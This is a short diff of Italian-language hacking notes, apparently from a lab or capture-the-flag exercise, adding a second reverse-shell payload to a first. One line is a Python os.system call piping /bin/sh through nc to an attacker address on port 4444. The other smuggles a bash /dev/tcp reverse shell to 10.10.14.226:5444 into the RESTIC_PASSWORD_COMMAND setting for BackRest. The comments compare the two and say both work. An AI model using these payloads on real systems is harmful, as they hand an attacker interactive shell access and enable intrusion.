@@ -2,4 +2,11 @@
     import os
     os.system("rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc <MY-IP> 4444 >/tmp/f")
     return x
+
+    A differenza di quella dopo (+standard) funziona anche se /dev/tcp non è disponibile
     
+#REVERSE SHELL 2: usata con BackRest
+    RESTIC_PASSWORD_COMMAND=bash -c 'bash -i >& /dev/tcp/10.10.14.226/5444 0>&1'
+
+Di base entrambe vanno bene, le avrei potute sostituire e sarebbero funzionate
+
